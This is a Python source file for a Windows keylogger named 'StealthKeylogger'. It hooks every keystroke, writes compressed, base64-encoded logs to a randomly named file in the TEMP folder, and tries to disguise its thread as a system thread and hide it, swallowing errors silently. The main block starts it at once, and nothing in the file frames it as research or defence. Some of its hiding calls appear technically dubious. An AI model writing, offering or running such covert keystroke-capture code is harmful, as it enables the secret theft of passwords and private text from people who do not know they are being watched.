import threading
import ctypes
import pythoncom
import pyHook
import win32clipboard
import os
import sys
import time
import random
import string
import base64
import zlib

class StealthKeylogger:
    def __init__(self):
        self.log = ""
        self.thread = None
        self.running = False
        self.hidden = False
        self.thread_id = None
        self.thread_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        self.module_name = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
        self.thread_native_id = None

    def _obfuscate_thread(self):
        kernel32 = ctypes.windll.kernel32
        self.thread_native_id = kernel32.GetCurrentThreadId()
        kernel32.SetThreadDescription(self.thread_native_id, f"SystemThread_{self.thread_name}")
        sys._current_frames().pop(self.thread_native_id, None)

    def _hide_thread(self):
        try:
            import win32api
            import win32con
            import win32security
            hThread = win32api.OpenThread(win32con.THREAD_ALL_ACCESS, False, self.thread_native_id)
            win32security.SetTokenInformation(hThread, win32security.TokenIntegrityLevel, win32security.TokenIntegrityLevel(win32security.SECURITY_MANDATORY_SYSTEM_RID))
            win32api.CloseHandle(hThread)
        except:
            pass

    def _compress_log(self, data):
        return base64.b64encode(zlib.compress(data.encode('utf-8'))).decode('utf-8')

    def _decompress_log(self, data):
        return zlib.decompress(base64.b64decode(data)).decode('utf-8')

    def _write_log(self):
        try:
            temp_path = os.path.join(os.getenv('TEMP'), f"{self.module_name}.tmp")
            with open(temp_path, 'a') as f:
                f.write(self._compress_log(self.log) + '\n')
            self.log = ""
        except:
            pass

    def _on_keyboard_event(self, event):
        if event.Ascii == 13:
            self.log += '\n'
        elif event.Ascii == 8:
            self.log = self.log[:-1]
        elif event.Ascii == 9:
            self.log += '[TAB]'
        elif event.Ascii == 27:
            self.log += '[ESC]'
        elif event.Ascii == 32:
            self.log += ' '
        else:
            self.log += chr(event.Ascii)
        if len(self.log) > 100:
            self._write_log()
        return True

    def _start_keylogger(self):
        self.running = True
        hm = pyHook.HookManager()
        hm.KeyDown = self._on_keyboard_event
        hm.HookKeyboard()
        pythoncom.PumpMessages()

    def start(self):
        if not self.running:
            self.thread = threading.Thread(target=self._start_keylogger, name=self.thread_name)
            self.thread.daemon = True
            self.thread.start()
            self.thread_id = self.thread.ident
            self._obfuscate_thread()
            self._hide_thread()
            self.hidden = True

    def stop(self):
        self.running = False
        if self.thread and self.thread.is_alive():
            try:
                ctypes.pythonapi.PyThreadState_SetAsyncExc(ctypes.c_long(self.thread_id), ctypes.py_object(SystemExit))
            except:
                pass

if __name__ == "__main__":
    logger = StealthKeylogger()
    logger.start()
